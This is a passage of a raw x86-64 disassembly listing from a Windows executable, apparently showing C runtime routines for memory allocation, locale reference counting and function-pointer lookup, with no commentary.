   1400094fd:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   140009504:	e8 43 d7 ff ff       	call   0x140006c4c
   140009509:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   140009510:	e8 37 d7 ff ff       	call   0x140006c4c
   140009515:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   14000951c:	e8 2b d7 ff ff       	call   0x140006c4c
   140009521:	48 8d 8b 60 01 00 00 	lea    0x160(%rbx),%rcx
   140009528:	8b d5                	mov    %ebp,%edx
   14000952a:	e8 3d ff ff ff       	call   0x14000946c
   14000952f:	48 8d 8b 98 01 00 00 	lea    0x198(%rbx),%rcx
   140009536:	8b d5                	mov    %ebp,%edx
   140009538:	e8 2f ff ff ff       	call   0x14000946c
   14000953d:	48 8d 8b d0 01 00 00 	lea    0x1d0(%rbx),%rcx
   140009544:	8b d6                	mov    %esi,%edx
   140009546:	e8 21 ff ff ff       	call   0x14000946c
   14000954b:	48 8d 8b 30 02 00 00 	lea    0x230(%rbx),%rcx
   140009552:	8b d6                	mov    %esi,%edx
   140009554:	e8 13 ff ff ff       	call   0x14000946c
   140009559:	48 8d 8b 90 02 00 00 	lea    0x290(%rbx),%rcx
   140009560:	8d 55 fb             	lea    -0x5(%rbp),%edx
   140009563:	e8 04 ff ff ff       	call   0x14000946c
   140009568:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   14000956f:	e8 d8 d6 ff ff       	call   0x140006c4c
   140009574:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   14000957b:	e8 cc d6 ff ff       	call   0x140006c4c
   140009580:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   140009587:	e8 c0 d6 ff ff       	call   0x140006c4c
   14000958c:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   140009593:	e8 b4 d6 ff ff       	call   0x140006c4c
   140009598:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000959d:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400095a2:	48 83 c4 20          	add    $0x20,%rsp
   1400095a6:	5e                   	pop    %rsi
   1400095a7:	c3                   	ret
   1400095a8:	40 53                	rex push %rbx
   1400095aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400095ae:	48 8b d9             	mov    %rcx,%rbx
   1400095b1:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   1400095b5:	77 3c                	ja     0x1400095f3
   1400095b7:	48 85 c9             	test   %rcx,%rcx
   1400095ba:	b8 01 00 00 00       	mov    $0x1,%eax
   1400095bf:	48 0f 44 d8          	cmove  %rax,%rbx
   1400095c3:	eb 15                	jmp    0x1400095da
   1400095c5:	e8 de c1 ff ff       	call   0x1400057a8
   1400095ca:	85 c0                	test   %eax,%eax
   1400095cc:	74 25                	je     0x1400095f3
   1400095ce:	48 8b cb             	mov    %rbx,%rcx
   1400095d1:	e8 fa 0c 00 00       	call   0x14000a2d0
   1400095d6:	85 c0                	test   %eax,%eax
   1400095d8:	74 19                	je     0x1400095f3
   1400095da:	48 8b 0d 0f 26 01 00 	mov    0x1260f(%rip),%rcx        # 0x14001bbf0
   1400095e1:	4c 8b c3             	mov    %rbx,%r8
   1400095e4:	33 d2                	xor    %edx,%edx
   1400095e6:	ff 15 a4 6b 00 00    	call   *0x6ba4(%rip)        # 0x140010190
   1400095ec:	48 85 c0             	test   %rax,%rax
   1400095ef:	74 d4                	je     0x1400095c5
   1400095f1:	eb 0d                	jmp    0x140009600
   1400095f3:	e8 bc d5 ff ff       	call   0x140006bb4
   1400095f8:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   1400095fe:	33 c0                	xor    %eax,%eax
   140009600:	48 83 c4 20          	add    $0x20,%rsp
   140009604:	5b                   	pop    %rbx
   140009605:	c3                   	ret
   140009606:	cc                   	int3
   140009607:	cc                   	int3
   140009608:	40 55                	rex push %rbp
   14000960a:	41 54                	push   %r12
   14000960c:	41 55                	push   %r13
   14000960e:	41 56                	push   %r14
   140009610:	41 57                	push   %r15
   140009612:	48 83 ec 60          	sub    $0x60,%rsp
   140009616:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   14000961b:	48 89 5d 60          	mov    %rbx,0x60(%rbp)
   14000961f:	48 89 75 68          	mov    %rsi,0x68(%rbp)
   140009623:	48 89 7d 70          	mov    %rdi,0x70(%rbp)
   140009627:	48 8b 05 d2 09 01 00 	mov    0x109d2(%rip),%rax        # 0x14001a000
   14000962e:	48 33 c5             	xor    %rbp,%rax
   140009631:	48 89 45 28          	mov    %rax,0x28(%rbp)
   140009635:	44 8b ea             	mov    %edx,%r13d
   140009638:	45 8b f9             	mov    %r9d,%r15d
   14000963b:	48 8b d1             	mov    %rcx,%rdx
   14000963e:	4d 8b e0             	mov    %r8,%r12
   140009641:	48 8d 4d 08          	lea    0x8(%rbp),%rcx
   140009645:	e8 72 e0 ff ff       	call   0x1400076bc
   14000964a:	8b bd 88 00 00 00    	mov    0x88(%rbp),%edi
   140009650:	85 ff                	test   %edi,%edi
   140009652:	75 07                	jne    0x14000965b
   140009654:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009658:	8b 78 0c             	mov    0xc(%rax),%edi
   14000965b:	f7 9d 90 00 00 00    	negl   0x90(%rbp)
   140009661:	45 8b cf             	mov    %r15d,%r9d
   140009664:	4d 8b c4             	mov    %r12,%r8
   140009667:	8b cf                	mov    %edi,%ecx
   140009669:	1b d2                	sbb    %edx,%edx
   14000966b:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140009670:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009676:	83 e2 08             	and    $0x8,%edx
   140009679:	ff c2                	inc    %edx
   14000967b:	e8 dc ee ff ff       	call   0x14000855c
   140009680:	4c 63 f0             	movslq %eax,%r14
   140009683:	85 c0                	test   %eax,%eax
   140009685:	75 07                	jne    0x14000968e
   140009687:	33 ff                	xor    %edi,%edi
   140009689:	e9 d0 00 00 00       	jmp    0x14000975e
   14000968e:	49 8b f6             	mov    %r14,%rsi
   140009691:	48 03 f6             	add    %rsi,%rsi
   140009694:	48 8d 46 10          	lea    0x10(%rsi),%rax
   140009698:	48 3b f0             	cmp    %rax,%rsi
   14000969b:	48 1b c9             	sbb    %rcx,%rcx
   14000969e:	48 23 c8             	and    %rax,%rcx
   1400096a1:	0f 84 9d 00 00 00    	je     0x140009744
   1400096a7:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   1400096ae:	77 31                	ja     0x1400096e1
   1400096b0:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   1400096b4:	48 3b c1             	cmp    %rcx,%rax
   1400096b7:	77 0a                	ja     0x1400096c3
   1400096b9:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   1400096c0:	ff ff 0f 
   1400096c3:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400096c7:	e8 84 56 00 00       	call   0x14000ed50
   1400096cc:	48 2b e0             	sub    %rax,%rsp
   1400096cf:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   1400096d4:	48 85 db             	test   %rbx,%rbx
   1400096d7:	74 6d                	je     0x140009746
   1400096d9:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   1400096df:	eb 13                	jmp    0x1400096f4
   1400096e1:	e8 c2 fe ff ff       	call   0x1400095a8
   1400096e6:	48 8b d8             	mov    %rax,%rbx
   1400096e9:	48 85 c0             	test   %rax,%rax
   1400096ec:	74 0a                	je     0x1400096f8
   1400096ee:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   1400096f4:	48 83 c3 10          	add    $0x10,%rbx
   1400096f8:	48 85 db             	test   %rbx,%rbx
   1400096fb:	74 49                	je     0x140009746
   1400096fd:	4c 8b c6             	mov    %rsi,%r8
   140009700:	33 d2                	xor    %edx,%edx
   140009702:	48 8b cb             	mov    %rbx,%rcx
   140009705:	e8 66 58 00 00       	call   0x14000ef70
   14000970a:	45 8b cf             	mov    %r15d,%r9d
   14000970d:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140009712:	4d 8b c4             	mov    %r12,%r8
   140009715:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000971a:	ba 01 00 00 00       	mov    $0x1,%edx
   14000971f:	8b cf                	mov    %edi,%ecx
   140009721:	e8 36 ee ff ff       	call   0x14000855c
   140009726:	85 c0                	test   %eax,%eax
   140009728:	74 1c                	je     0x140009746
   14000972a:	4c 8b 8d 80 00 00 00 	mov    0x80(%rbp),%r9
   140009731:	44 8b c0             	mov    %eax,%r8d
   140009734:	48 8b d3             	mov    %rbx,%rdx
   140009737:	41 8b cd             	mov    %r13d,%ecx
   14000973a:	ff 15 d0 6a 00 00    	call   *0x6ad0(%rip)        # 0x140010210
   140009740:	8b f8                	mov    %eax,%edi
   140009742:	eb 09                	jmp    0x14000974d
   140009744:	33 db                	xor    %ebx,%ebx
   140009746:	33 ff                	xor    %edi,%edi
   140009748:	48 85 db             	test   %rbx,%rbx
   14000974b:	74 11                	je     0x14000975e
   14000974d:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   140009751:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   140009757:	75 05                	jne    0x14000975e
   140009759:	e8 ee d4 ff ff       	call   0x140006c4c
   14000975e:	80 7d 20 00          	cmpb   $0x0,0x20(%rbp)
   140009762:	74 0b                	je     0x14000976f
   140009764:	48 8b 45 08          	mov    0x8(%rbp),%rax
   140009768:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000976f:	8b c7                	mov    %edi,%eax
   140009771:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   140009775:	48 33 cd             	xor    %rbp,%rcx
   140009778:	e8 e3 7b ff ff       	call   0x140001360
   14000977d:	48 8b 5d 60          	mov    0x60(%rbp),%rbx
   140009781:	48 8b 75 68          	mov    0x68(%rbp),%rsi
   140009785:	48 8b 7d 70          	mov    0x70(%rbp),%rdi
   140009789:	48 8d 65 30          	lea    0x30(%rbp),%rsp
   14000978d:	41 5f                	pop    %r15
   14000978f:	41 5e                	pop    %r14
   140009791:	41 5d                	pop    %r13
   140009793:	41 5c                	pop    %r12
   140009795:	5d                   	pop    %rbp
   140009796:	c3                   	ret
   140009797:	cc                   	int3
   140009798:	f0 ff 41 10          	lock incl 0x10(%rcx)
   14000979c:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   1400097a3:	48 85 c0             	test   %rax,%rax
   1400097a6:	74 03                	je     0x1400097ab
   1400097a8:	f0 ff 00             	lock incl (%rax)
   1400097ab:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   1400097b2:	48 85 c0             	test   %rax,%rax
   1400097b5:	74 03                	je     0x1400097ba
   1400097b7:	f0 ff 00             	lock incl (%rax)
   1400097ba:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   1400097c1:	48 85 c0             	test   %rax,%rax
   1400097c4:	74 03                	je     0x1400097c9
   1400097c6:	f0 ff 00             	lock incl (%rax)
   1400097c9:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   1400097d0:	48 85 c0             	test   %rax,%rax
   1400097d3:	74 03                	je     0x1400097d8
   1400097d5:	f0 ff 00             	lock incl (%rax)
   1400097d8:	48 8d 41 38          	lea    0x38(%rcx),%rax
   1400097dc:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   1400097e2:	48 8d 15 5f 0f 01 00 	lea    0x10f5f(%rip),%rdx        # 0x14001a748
   1400097e9:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   1400097ed:	74 0b                	je     0x1400097fa
   1400097ef:	48 8b 10             	mov    (%rax),%rdx
   1400097f2:	48 85 d2             	test   %rdx,%rdx
   1400097f5:	74 03                	je     0x1400097fa
   1400097f7:	f0 ff 02             	lock incl (%rdx)
   1400097fa:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   1400097ff:	74 0c                	je     0x14000980d
   140009801:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   140009805:	48 85 d2             	test   %rdx,%rdx
   140009808:	74 03                	je     0x14000980d
   14000980a:	f0 ff 02             	lock incl (%rdx)
   14000980d:	48 83 c0 20          	add    $0x20,%rax
   140009811:	49 83 e8 01          	sub    $0x1,%r8
   140009815:	75 cb                	jne    0x1400097e2
   140009817:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   14000981e:	e9 79 01 00 00       	jmp    0x14000999c
   140009823:	cc                   	int3
   140009824:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009829:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000982e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140009833:	57                   	push   %rdi
   140009834:	48 83 ec 20          	sub    $0x20,%rsp
   140009838:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   14000983f:	48 8b d9             	mov    %rcx,%rbx
   140009842:	48 85 c0             	test   %rax,%rax
   140009845:	74 79                	je     0x1400098c0
   140009847:	48 8d 0d 02 0f 01 00 	lea    0x10f02(%rip),%rcx        # 0x14001a750
   14000984e:	48 3b c1             	cmp    %rcx,%rax
   140009851:	74 6d                	je     0x1400098c0
   140009853:	48 8b 83 e0 00 00 00 	mov    0xe0(%rbx),%rax
   14000985a:	48 85 c0             	test   %rax,%rax
   14000985d:	74 61                	je     0x1400098c0
   14000985f:	83 38 00             	cmpl   $0x0,(%rax)
   140009862:	75 5c                	jne    0x1400098c0
   140009864:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   14000986b:	48 85 c9             	test   %rcx,%rcx
   14000986e:	74 16                	je     0x140009886
   140009870:	83 39 00             	cmpl   $0x0,(%rcx)
   140009873:	75 11                	jne    0x140009886
   140009875:	e8 d2 d3 ff ff       	call   0x140006c4c
   14000987a:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140009881:	e8 6e fa ff ff       	call   0x1400092f4
   140009886:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   14000988d:	48 85 c9             	test   %rcx,%rcx
   140009890:	74 16                	je     0x1400098a8
   140009892:	83 39 00             	cmpl   $0x0,(%rcx)
   140009895:	75 11                	jne    0x1400098a8
   140009897:	e8 b0 d3 ff ff       	call   0x140006c4c
   14000989c:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   1400098a3:	e8 58 fb ff ff       	call   0x140009400
   1400098a8:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   1400098af:	e8 98 d3 ff ff       	call   0x140006c4c
   1400098b4:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   1400098bb:	e8 8c d3 ff ff       	call   0x140006c4c
   1400098c0:	48 8b 83 00 01 00 00 	mov    0x100(%rbx),%rax
   1400098c7:	48 85 c0             	test   %rax,%rax
   1400098ca:	74 47                	je     0x140009913
   1400098cc:	83 38 00             	cmpl   $0x0,(%rax)
   1400098cf:	75 42                	jne    0x140009913
   1400098d1:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   1400098d8:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   1400098df:	e8 68 d3 ff ff       	call   0x140006c4c
   1400098e4:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   1400098eb:	bf 80 00 00 00       	mov    $0x80,%edi
   1400098f0:	48 2b cf             	sub    %rdi,%rcx
   1400098f3:	e8 54 d3 ff ff       	call   0x140006c4c
   1400098f8:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   1400098ff:	48 2b cf             	sub    %rdi,%rcx
   140009902:	e8 45 d3 ff ff       	call   0x140006c4c
   140009907:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   14000990e:	e8 39 d3 ff ff       	call   0x140006c4c
   140009913:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   14000991a:	e8 a5 00 00 00       	call   0x1400099c4
   14000991f:	48 8d b3 28 01 00 00 	lea    0x128(%rbx),%rsi
   140009926:	bd 06 00 00 00       	mov    $0x6,%ebp
   14000992b:	48 8d 7b 38          	lea    0x38(%rbx),%rdi
   14000992f:	48 8d 05 12 0e 01 00 	lea    0x10e12(%rip),%rax        # 0x14001a748
   140009936:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   14000993a:	74 1a                	je     0x140009956
   14000993c:	48 8b 0f             	mov    (%rdi),%rcx
   14000993f:	48 85 c9             	test   %rcx,%rcx
   140009942:	74 12                	je     0x140009956
   140009944:	83 39 00             	cmpl   $0x0,(%rcx)
   140009947:	75 0d                	jne    0x140009956
   140009949:	e8 fe d2 ff ff       	call   0x140006c4c
   14000994e:	48 8b 0e             	mov    (%rsi),%rcx
   140009951:	e8 f6 d2 ff ff       	call   0x140006c4c
   140009956:	48 83 7f e8 00       	cmpq   $0x0,-0x18(%rdi)
   14000995b:	74 13                	je     0x140009970
   14000995d:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   140009961:	48 85 c9             	test   %rcx,%rcx
   140009964:	74 0a                	je     0x140009970
   140009966:	83 39 00             	cmpl   $0x0,(%rcx)
   140009969:	75 05                	jne    0x140009970
   14000996b:	e8 dc d2 ff ff       	call   0x140006c4c
   140009970:	48 83 c6 08          	add    $0x8,%rsi
   140009974:	48 83 c7 20          	add    $0x20,%rdi
   140009978:	48 83 ed 01          	sub    $0x1,%rbp
   14000997c:	75 b1                	jne    0x14000992f
   14000997e:	48 8b cb             	mov    %rbx,%rcx
   140009981:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009986:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000998b:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140009990:	48 83 c4 20          	add    $0x20,%rsp
   140009994:	5f                   	pop    %rdi
   140009995:	e9 b2 d2 ff ff       	jmp    0x140006c4c
   14000999a:	cc                   	int3
   14000999b:	cc                   	int3
   14000999c:	48 85 c9             	test   %rcx,%rcx
   14000999f:	74 1c                	je     0x1400099bd
   1400099a1:	48 8d 05 78 7e 00 00 	lea    0x7e78(%rip),%rax        # 0x140011820
   1400099a8:	48 3b c8             	cmp    %rax,%rcx
   1400099ab:	74 10                	je     0x1400099bd
   1400099ad:	b8 01 00 00 00       	mov    $0x1,%eax
   1400099b2:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   1400099b9:	00 
   1400099ba:	ff c0                	inc    %eax
   1400099bc:	c3                   	ret
   1400099bd:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   1400099c2:	c3                   	ret
   1400099c3:	cc                   	int3
   1400099c4:	48 85 c9             	test   %rcx,%rcx
   1400099c7:	74 31                	je     0x1400099fa
   1400099c9:	53                   	push   %rbx
   1400099ca:	48 83 ec 20          	sub    $0x20,%rsp
   1400099ce:	48 8d 05 4b 7e 00 00 	lea    0x7e4b(%rip),%rax        # 0x140011820
   1400099d5:	48 8b d9             	mov    %rcx,%rbx
   1400099d8:	48 3b c8             	cmp    %rax,%rcx
   1400099db:	74 18                	je     0x1400099f5
   1400099dd:	8b 81 5c 01 00 00    	mov    0x15c(%rcx),%eax
   1400099e3:	90                   	nop
   1400099e4:	85 c0                	test   %eax,%eax
   1400099e6:	75 0d                	jne    0x1400099f5
   1400099e8:	e8 b3 fa ff ff       	call   0x1400094a0
   1400099ed:	48 8b cb             	mov    %rbx,%rcx
   1400099f0:	e8 57 d2 ff ff       	call   0x140006c4c
   1400099f5:	48 83 c4 20          	add    $0x20,%rsp
   1400099f9:	5b                   	pop    %rbx
   1400099fa:	c3                   	ret
   1400099fb:	cc                   	int3
   1400099fc:	48 85 c9             	test   %rcx,%rcx
   1400099ff:	74 1a                	je     0x140009a1b
   140009a01:	48 8d 05 18 7e 00 00 	lea    0x7e18(%rip),%rax        # 0x140011820
   140009a08:	48 3b c8             	cmp    %rax,%rcx
   140009a0b:	74 0e                	je     0x140009a1b
   140009a0d:	83 c8 ff             	or     $0xffffffff,%eax
   140009a10:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   140009a17:	00 
   140009a18:	ff c8                	dec    %eax
   140009a1a:	c3                   	ret
   140009a1b:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   140009a20:	c3                   	ret
   140009a21:	cc                   	int3
   140009a22:	cc                   	int3
   140009a23:	cc                   	int3
   140009a24:	48 83 ec 28          	sub    $0x28,%rsp
   140009a28:	48 85 c9             	test   %rcx,%rcx
   140009a2b:	0f 84 96 00 00 00    	je     0x140009ac7
   140009a31:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140009a35:	f0 44 01 49 10       	lock add %r9d,0x10(%rcx)
   140009a3a:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   140009a41:	48 85 c0             	test   %rax,%rax
   140009a44:	74 04                	je     0x140009a4a
   140009a46:	f0 44 01 08          	lock add %r9d,(%rax)
   140009a4a:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   140009a51:	48 85 c0             	test   %rax,%rax
   140009a54:	74 04                	je     0x140009a5a
   140009a56:	f0 44 01 08          	lock add %r9d,(%rax)
   140009a5a:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   140009a61:	48 85 c0             	test   %rax,%rax
   140009a64:	74 04                	je     0x140009a6a
   140009a66:	f0 44 01 08          	lock add %r9d,(%rax)
   140009a6a:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   140009a71:	48 85 c0             	test   %rax,%rax
   140009a74:	74 04                	je     0x140009a7a
   140009a76:	f0 44 01 08          	lock add %r9d,(%rax)
   140009a7a:	48 8d 41 38          	lea    0x38(%rcx),%rax
   140009a7e:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140009a84:	48 8d 15 bd 0c 01 00 	lea    0x10cbd(%rip),%rdx        # 0x14001a748
   140009a8b:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   140009a8f:	74 0c                	je     0x140009a9d
   140009a91:	48 8b 10             	mov    (%rax),%rdx
   140009a94:	48 85 d2             	test   %rdx,%rdx
   140009a97:	74 04                	je     0x140009a9d
   140009a99:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140009a9d:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   140009aa2:	74 0d                	je     0x140009ab1
   140009aa4:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   140009aa8:	48 85 d2             	test   %rdx,%rdx
   140009aab:	74 04                	je     0x140009ab1
   140009aad:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140009ab1:	48 83 c0 20          	add    $0x20,%rax
   140009ab5:	49 83 e8 01          	sub    $0x1,%r8
   140009ab9:	75 c9                	jne    0x140009a84
   140009abb:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   140009ac2:	e8 35 ff ff ff       	call   0x1400099fc
   140009ac7:	48 83 c4 28          	add    $0x28,%rsp
   140009acb:	c3                   	ret
   140009acc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009ad1:	57                   	push   %rdi
   140009ad2:	48 83 ec 20          	sub    $0x20,%rsp
   140009ad6:	e8 b9 c8 ff ff       	call   0x140006394
   140009adb:	48 8d b8 90 00 00 00 	lea    0x90(%rax),%rdi
   140009ae2:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   140009ae8:	8b 05 02 0d 01 00    	mov    0x10d02(%rip),%eax        # 0x14001a7f0
   140009aee:	85 c8                	test   %ecx,%eax
   140009af0:	74 08                	je     0x140009afa
   140009af2:	48 8b 1f             	mov    (%rdi),%rbx
   140009af5:	48 85 db             	test   %rbx,%rbx
   140009af8:	75 2c                	jne    0x140009b26
   140009afa:	b9 04 00 00 00       	mov    $0x4,%ecx
   140009aff:	e8 68 f1 ff ff       	call   0x140008c6c
   140009b04:	90                   	nop
   140009b05:	48 8b 15 2c 1f 01 00 	mov    0x11f2c(%rip),%rdx        # 0x14001ba38
   140009b0c:	48 8b cf             	mov    %rdi,%rcx
   140009b0f:	e8 28 00 00 00       	call   0x140009b3c
   140009b14:	48 8b d8             	mov    %rax,%rbx
   140009b17:	b9 04 00 00 00       	mov    $0x4,%ecx
   140009b1c:	e8 9f f1 ff ff       	call   0x140008cc0
   140009b21:	48 85 db             	test   %rbx,%rbx
   140009b24:	74 0e                	je     0x140009b34
   140009b26:	48 8b c3             	mov    %rbx,%rax
   140009b29:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009b2e:	48 83 c4 20          	add    $0x20,%rsp
   140009b32:	5f                   	pop    %rdi
   140009b33:	c3                   	ret
   140009b34:	e8 d7 c2 ff ff       	call   0x140005e10
   140009b39:	90                   	nop
   140009b3a:	cc                   	int3
   140009b3b:	cc                   	int3
   140009b3c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009b41:	57                   	push   %rdi
   140009b42:	48 83 ec 20          	sub    $0x20,%rsp
   140009b46:	48 8b fa             	mov    %rdx,%rdi
   140009b49:	48 85 d2             	test   %rdx,%rdx
   140009b4c:	74 46                	je     0x140009b94
   140009b4e:	48 85 c9             	test   %rcx,%rcx
   140009b51:	74 41                	je     0x140009b94
   140009b53:	48 8b 19             	mov    (%rcx),%rbx
   140009b56:	48 3b da             	cmp    %rdx,%rbx
   140009b59:	75 05                	jne    0x140009b60
   140009b5b:	48 8b c7             	mov    %rdi,%rax
   140009b5e:	eb 36                	jmp    0x140009b96
   140009b60:	48 89 39             	mov    %rdi,(%rcx)
   140009b63:	48 8b cf             	mov    %rdi,%rcx
   140009b66:	e8 2d fc ff ff       	call   0x140009798
   140009b6b:	48 85 db             	test   %rbx,%rbx
   140009b6e:	74 eb                	je     0x140009b5b
   140009b70:	48 8b cb             	mov    %rbx,%rcx
   140009b73:	e8 ac fe ff ff       	call   0x140009a24
   140009b78:	83 7b 10 00          	cmpl   $0x0,0x10(%rbx)
   140009b7c:	75 dd                	jne    0x140009b5b
   140009b7e:	48 8d 05 5b 0a 01 00 	lea    0x10a5b(%rip),%rax        # 0x14001a5e0
   140009b85:	48 3b d8             	cmp    %rax,%rbx
   140009b88:	74 d1                	je     0x140009b5b
   140009b8a:	48 8b cb             	mov    %rbx,%rcx
   140009b8d:	e8 92 fc ff ff       	call   0x140009824
   140009b92:	eb c7                	jmp    0x140009b5b
   140009b94:	33 c0                	xor    %eax,%eax
   140009b96:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009b9b:	48 83 c4 20          	add    $0x20,%rsp
   140009b9f:	5f                   	pop    %rdi
   140009ba0:	c3                   	ret
   140009ba1:	cc                   	int3
   140009ba2:	cc                   	int3
   140009ba3:	cc                   	int3
   140009ba4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009ba9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140009bae:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140009bb3:	57                   	push   %rdi
   140009bb4:	41 54                	push   %r12
   140009bb6:	41 55                	push   %r13
   140009bb8:	41 56                	push   %r14
   140009bba:	41 57                	push   %r15
   140009bbc:	48 83 ec 20          	sub    $0x20,%rsp
   140009bc0:	44 8b f9             	mov    %ecx,%r15d
   140009bc3:	4c 8d 35 36 64 ff ff 	lea    -0x9bca(%rip),%r14        # 0x140000000
   140009bca:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   140009bce:	4d 8b e1             	mov    %r9,%r12
   140009bd1:	49 8b e8             	mov    %r8,%rbp
   140009bd4:	4c 8b ea             	mov    %rdx,%r13
   140009bd7:	4f 8b 94 fe f0 ba 01 	mov    0x1baf0(%r14,%r15,8),%r10
   140009bde:	00 
   140009bdf:	90                   	nop
   140009be0:	4c 8b 1d 19 04 01 00 	mov    0x10419(%rip),%r11        # 0x14001a000
   140009be7:	4d 33 d3             	xor    %r11,%r10
   140009bea:	41 8b cb             	mov    %r11d,%ecx
   140009bed:	83 e1 3f             	and    $0x3f,%ecx
   140009bf0:	49 d3 ca             	ror    %cl,%r10
   140009bf3:	4c 3b d7             	cmp    %rdi,%r10
   140009bf6:	0f 84 eb 00 00 00    	je     0x140009ce7
   140009bfc:	4d 85 d2             	test   %r10,%r10
   140009bff:	74 08                	je     0x140009c09
   140009c01:	49 8b c2             	mov    %r10,%rax
   140009c04:	e9 e0 00 00 00       	jmp    0x140009ce9
   140009c09:	4d 3b c4             	cmp    %r12,%r8
   140009c0c:	0f 84 ba 00 00 00    	je     0x140009ccc
   140009c12:	8b 75 00             	mov    0x0(%rbp),%esi
   140009c15:	49 8b 9c f6 40 ba 01 	mov    0x1ba40(%r14,%rsi,8),%rbx
   140009c1c:	00 
   140009c1d:	90                   	nop
   140009c1e:	48 85 db             	test   %rbx,%rbx
   140009c21:	74 0e                	je     0x140009c31
   140009c23:	48 3b df             	cmp    %rdi,%rbx
   140009c26:	0f 85 fa 00 00 00    	jne    0x140009d26
   140009c2c:	e9 87 00 00 00       	jmp    0x140009cb8
   140009c31:	4d 8b b4 f6 b0 24 01 	mov    0x124b0(%r14,%rsi,8),%r14
   140009c38:	00 
   140009c39:	33 d2                	xor    %edx,%edx
   140009c3b:	49 8b ce             	mov    %r14,%rcx
   140009c3e:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140009c44:	ff 15 ee 64 00 00    	call   *0x64ee(%rip)        # 0x140010138
   140009c4a:	48 8b d8             	mov    %rax,%rbx
   140009c4d:	48 85 c0             	test   %rax,%rax
